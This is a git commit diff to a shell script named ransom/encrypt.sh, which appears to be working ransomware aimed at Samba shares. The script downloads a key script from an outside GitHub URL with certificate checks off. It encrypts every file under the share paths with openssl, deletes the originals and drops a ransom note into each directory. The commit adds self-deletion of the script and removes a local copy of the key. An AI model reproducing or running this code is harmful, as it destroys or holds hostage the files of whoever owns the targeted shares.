6c8a82f83b7cd790803f88a9a663516b86520b78
absane <jsibley1@gmail.com>
2017-05-31 17:09:30 -0400

    Update encrypt.sh

--- ransom/encrypt.sh
+++ ransom/encrypt.sh
@@ -16,17 +16,14 @@ smb="True"
 wget 'https://raw.githubusercontent.com/absane/Tricks/master/ransom/key.php' -O /tmp/key.php --no-check-certificate
 . /tmp/dynamicconfig.ini
 KEY=$(php /tmp/key.php $DEVICEID)
-DEVICEID=''
 rm /tmp/key.php
-
-echo $KEY > /tmp/thekey
 
 # Encrypt files
 if [ $smb == "True" ]
 then
-	for i in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
+	for file in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
 	do
-		find -L "$i" -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
+		find -L "$file" -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
 	done
 else
 	find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
@@ -36,3 +33,5 @@ fi
 #	Warn user their files are encrypted
 curl $splashLocation -s > /tmp/READTHIS_YourFilesAreEncrypted.html
 find -L $targetFolder -type d -exec cp /tmp/READTHIS_YourFilesAreEncrypted.html '{}' \;
+
+rm /tmp/ransom.sh
